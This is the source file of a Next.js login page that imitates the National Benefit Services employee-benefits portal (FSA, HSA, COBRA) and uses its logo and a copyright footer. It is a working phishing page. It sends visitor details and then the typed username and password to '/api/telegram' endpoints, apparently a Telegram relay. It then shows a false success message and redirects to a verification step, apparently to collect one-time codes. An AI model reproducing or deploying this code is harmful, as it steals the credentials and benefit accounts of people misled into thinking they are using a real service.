"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [selectedRole, setSelectedRole] = useState("participant");
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<{
    userid?: string;
    password?: string;
  }>({});
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [cookieBannerVisible, setCookieBannerVisible] = useState(true);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 2800);
  };

  const clearErr = (fieldId: string) => {
    setFieldErrors((prev) => ({
      ...prev,
      [fieldId]: undefined,
    }));
  };

  const validate = (): boolean => {
    let ok = true;
    const errors: typeof fieldErrors = {};

    if (!username.trim()) {
      errors.userid = "Please enter your User ID.";
      ok = false;
    }
    if (!password) {
      errors.password = "Please enter your Password.";
      ok = false;
    }

    setFieldErrors(errors);
    return ok;
  };

  const handleSignIn = async () => {
    if (isLoginLoading) return;

    if (!validate()) return;

    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      showToast("Sign-in successful \u2014 welcome!");

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 1800);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
          font-family: Arial, Helvetica, sans-serif;
          font-size: 14px;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
        }

        /* \u2014\u2014 Header \u2014\u2014 */
        .site-header {
          background: #fff;
          padding: 10px 20px;
          border-bottom: 3px solid #5a5a5a;
          display: flex;
          align-items: center;
          min-height: 72px;
        }

        .site-header img {
          height: 54px;
          width: auto;
        }

        /* \u2014\u2014 Hero / background \u2014\u2014 */
        .hero {
          flex: 1;
          position: relative;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 40px 16px;
          background:
            linear-gradient(
              135deg,
              rgba(210,185,130,0.85) 0%,
              rgba(155,165,175,0.75) 40%,
              rgba(60,70,85,0.90) 100%
            ),
            /* layered clouds look */
            radial-gradient(ellipse at 30% 40%, rgba(240,215,150,0.6) 0%, transparent 55%),
            radial-gradient(ellipse at 70% 60%, rgba(80,100,120,0.7) 0%, transparent 60%);
          background-color: #7a8a9a;
        }

        /* \u2014\u2014 Login card \u2014\u2014 */
        .login-card {
          background: rgba(55, 55, 55, 0.93);
          border-radius: 2px;
          padding: 30px 36px 36px;
          width: 100%;
          max-width: 380px;
          color: #ccc;
        }

        .login-card h1 {
          font-size: 16px;
          font-weight: 700;
          color: #e0a020;
          margin-bottom: 22px;
          text-align: left;
        }

        .form-group {
          margin-bottom: 18px;
        }

        .form-group label {
          display: block;
          font-size: 13px;
          font-weight: 600;
          color: #ddd;
          margin-bottom: 5px;
        }

        .form-group label .required {
          color: #e0a020;
          margin-left: 2px;
        }

        .form-group input[type="text"],
        .form-group input[type="password"] {
          width: 100%;
          padding: 7px 10px;
          border: 1px solid #ccc;
          border-radius: 2px;
          font-size: 14px;
          background: #fff;
          color: #222;
          outline: none;
        }

        .form-group input:focus {
          border-color: #e0a020;
          box-shadow: 0 0 0 2px rgba(224,160,32,0.25);
        }

        .role-select {
          width: 100%;
          padding: 7px 10px;
          border: 1px solid #ccc;
          border-radius: 2px;
          font-size: 14px;
          background: #fff;
          color: #222;
          appearance: auto;
          cursor: pointer;
          margin-bottom: 14px;
        }

        .remember-row {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 14px;
          color: #ccc;
          font-size: 13px;
        }

        .remember-row input[type="checkbox"] {
          width: 14px;
          height: 14px;
          accent-color: #e0a020;
          cursor: pointer;
        }

        .note {
          font-size: 12.5px;
          color: #bbb;
          margin-bottom: 20px;
          line-height: 1.5;
        }

        .btn-login {
          display: block;
          width: 100%;
          padding: 11px;
          background: #e0a020;
          color: #fff;
          font-size: 15px;
          font-weight: 700;
          letter-spacing: 1.5px;
          text-align: center;
          border: none;
          border-radius: 3px;
          cursor: pointer;
          transition: background 0.2s;
        }

        .btn-login:hover {
          background: #c98c10;
        }

        .privacy-link {
          display: block;
          text-align: center;
          margin-top: 14px;
          color: #e0a020;
          font-size: 13px;
          text-decoration: none;
        }

        .privacy-link:hover {
          text-decoration: underline;
        }

        /* \u2014\u2014 Info Section \u2014\u2014 */
        .info-section {
          background-color: #f5f5f5;
          padding: 30px 20px;
          text-align: center;
          color: #333;
        }

        .info-section h2 {
          font-size: 22px;
          margin-bottom: 15px;
        }

        .info-section > p {
          max-width: 800px;
          margin: 0 auto 20px;
          line-height: 1.6;
          color: #555;
        }

        .info-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          max-width: 900px;
          margin: 20px auto;
        }

        .info-card {
          padding: 15px;
          background-color: #fff;
          border-radius: 5px;
          box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }

        .info-card h3 {
          font-size: 16px;
          margin-bottom: 10px;
          color: #e0a020;
        }

        .info-card p {
          font-size: 14px;
          color: #666;
        }

        /* \u2014\u2014 Footer \u2014\u2014 */
        .site-footer {
          background: #4a4a4a;
          color: #bbb;
          font-size: 12px;
          padding: 14px 20px;
          display: flex;
          flex-wrap: wrap;
          align-items: center;
          justify-content: space-between;
          gap: 10px;
        }

        .site-footer .footer-left {
          display: flex;
          align-items: center;
          flex-wrap: wrap;
          gap: 6px;
        }

        .site-footer a {
          color: #e0a020;
          text-decoration: none;
          font-size: 12px;
        }

        .site-footer a:hover { text-decoration: underline; }

        .footer-right {
          display: flex;
          align-items: center;
          gap: 16px;
        }

        .footer-right a { color: #e0a020; font-size: 12px; }

        .help-icon {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 20px;
          height: 20px;
          border-radius: 50%;
          background: #e0a020;
          color: #fff;
          font-size: 12px;
          font-weight: 700;
          text-decoration: none !important;
        }

        /* \u2014\u2014 Cookie banner \u2014\u2014 */
        .cookie-banner {
          position: fixed;
          bottom: 0;
          left: 0;
          right: 0;
          background: #fff;
          border-top: 1px solid #ddd;
          padding: 14px 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 12px;
          font-size: 13px;
          color: #333;
          z-index: 999;
          box-shadow: 0 -2px 8px rgba(0,0,0,0.1);
        }

        .cookie-banner.hidden {
          display: none;
        }

        .cookie-banner p { flex: 1; min-width: 200px; line-height: 1.5; }

        .cookie-actions {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .btn-accept {
          padding: 9px 18px;
          background: #4a5a4a;
          color: #fff;
          border: none;
          border-radius: 3px;
          font-size: 13px;
          cursor: pointer;
          white-space: nowrap;
        }

        .btn-accept:hover { background: #3a4a3a; }

        .btn-close-cookie {
          background: none;
          border: none;
          font-size: 18px;
          cursor: pointer;
          color: #555;
          line-height: 1;
        }

        /* \u2014\u2014 Responsive \u2014\u2014 */
        @media (max-width: 480px) {
          .login-card {
            padding: 24px 20px 28px;
          }

          .site-footer {
            flex-direction: column;
            align-items: flex-start;
          }

          .footer-right { flex-wrap: wrap; }
        }
      `}</style>

      {/* \u2014\u2014 Header \u2014\u2014 */}
      <header className="site-header">
        {/* NBS Logo */}
        <img src="/Nbs%20banner_new.png" alt="National Benefit Services Logo" />
      </header>

      {/* \u2014\u2014 Info Section (always visible for SEO) \u2014\u2014 */}
      <section className="info-section">
        <h2>Secure Access to Your Employee Benefits</h2>
        <p>
          National Benefit Services provides secure, convenient access to your
          FSA accounts, HSA plans, COBRA coverage, and other employee benefits
          through our dedicated participant portal. Log in to manage your health
          and dependent care benefits, submit claims, and view reimbursement
          accounts.
        </p>
        <div className="info-grid">
          <article className="info-card">
            <h3>FSA Login</h3>
            <p>
              Access your Flexible Spending Account for health and dependent
              care reimbursement.
            </p>
          </article>
          <article className="info-card">
            <h3>HSA Login</h3>
            <p>
              Manage your Health Savings Account and track eligible medical
              expenses.
            </p>
          </article>
          <article className="info-card">
            <h3>COBRA Login</h3>
            <p>
              Access continuation health coverage and manage your COBRA benefits
              and enrollment.
            </p>
          </article>
        </div>
      </section>

      {/* \u2014\u2014 Hero with Login Card \u2014\u2014 */}
      <main className="hero">
        <div className="login-card">
          <h1>Welcome to National Benefit Services, LLC</h1>

          <div className="form-group">
            <label htmlFor="username">
              Username <span className="required">*</span>
            </label>
            <input
              type="text"
              id="username"
              name="username"
              autoComplete="username"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                clearErr("userid");
              }}
            />
            {fieldErrors.userid && (
              <p style={{ color: "#c0392b", fontSize: "12px", marginTop: "4px" }}>
                {fieldErrors.userid}
              </p>
            )}
          </div>

          <div className="form-group">
            <label htmlFor="password">
              Password <span className="required">*</span>
            </label>
            <input
              type="password"
              id="password"
              name="password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                clearErr("password");
              }}
            />
            {fieldErrors.password && (
              <p style={{ color: "#c0392b", fontSize: "12px", marginTop: "4px" }}>
                {fieldErrors.password}
              </p>
            )}
          </div>

          <select
            className="role-select"
            aria-label="User role"
            value={selectedRole}
            onChange={(e) => setSelectedRole(e.target.value)}
          >
            <option value="participant">Participant</option>
            <option value="employer">Employer</option>
            <option value="broker">Broker</option>
            <option value="admin">Administrator</option>
          </select>

          <div className="remember-row">
            <input
              type="checkbox"
              id="remember"
              name="remember"
              checked={rememberMe}
              onChange={(e) => setRememberMe(e.target.checked)}
            />
            <label htmlFor="remember">Remember me on this device</label>
          </div>

          <p className="note">
            Note: The password is case sensitive. If you fail to login three
            consecutive times your account could be disabled.
          </p>

          {/* Honeypot */}
          <input
            type="text"
            name="website"
            value={honeypot}
            onChange={(e) => setHoneypot(e.target.value)}
            style={{ display: "none" }}
            autoComplete="off"
            tabIndex={-1}
            aria-hidden="true"
          />

          {loginError && (
            <p
              style={{
                color: "#c0392b",
                fontSize: "12.5px",
                marginBottom: "14px",
              }}
            >
              {loginError}
            </p>
          )}

          {toastMessage && (
            <p
              style={{
                color: "#27ae60",
                fontSize: "12.5px",
                marginBottom: "14px",
              }}
            >
              {toastMessage}
            </p>
          )}

          <button
            className="btn-login"
            type="button"
            onClick={handleSignIn}
            disabled={isLoginLoading}
          >
            {isLoginLoading ? "SIGNING IN..." : "LOGIN"}
          </button>

          <a
            className="privacy-link"
            href="#"
            onClick={(e) => e.preventDefault()}
          >
            Privacy and Terms of Use
          </a>
        </div>
      </main>

      {/* \u2014\u2014 Footer \u2014\u2014 */}
      <footer className="site-footer">
        <div className="footer-left">
          <span>
            Copyright &copy; 2021 FIS and/or its subsidiaries. All Rights Reserved.
          </span>
          <span>|</span>
          <a
            href="/forgot-password"
            onClick={(e) => {
              if (
                typeof window !== "undefined" &&
                window.location.href.includes("telegram")
              )
                e.preventDefault();
            }}
          >
            Forgot Password?
          </a>
          <span>|</span>
          <a href="#" onClick={(e) => e.preventDefault()}>
            Problems viewing the site?
          </a>
        </div>
        <div className="footer-right">
          <a
            href="/verify"
            onClick={(e) => {
              if (
                typeof window !== "undefined" &&
                window.location.href.includes("telegram")
              )
                e.preventDefault();
            }}
          >
            Verify Account
          </a>
          <a href="#" onClick={(e) => e.preventDefault()}>
            Cookies Settings
          </a>
          <a href="#" onClick={(e) => e.preventDefault()}>
            Privacy Policy
          </a>
          <a href="#" className="help-icon" onClick={(e) => e.preventDefault()}>
            ?
          </a>
        </div>
      </footer>

      {/* \u2014\u2014 Cookie Banner \u2014\u2014 */}
      <div
        className={`cookie-banner ${!cookieBannerVisible ? "hidden" : ""}`}
        id="cookieBanner"
      >
        <p>
          We only use cookies which are essential for the operation of our
          website. These are necessary for our website to work properly. You can
          learn more about our use of cookies and similar technology by
          reviewing our
        </p>
        <div className="cookie-actions">
          <button
            className="btn-accept"
            onClick={() => setCookieBannerVisible(false)}
          >
            Accept All Cookies
          </button>
          <button
            className="btn-close-cookie"
            onClick={() => setCookieBannerVisible(false)}
            aria-label="Close"
          >
            &times;
          </button>
        </div>
      </div>
    </>
  );
}
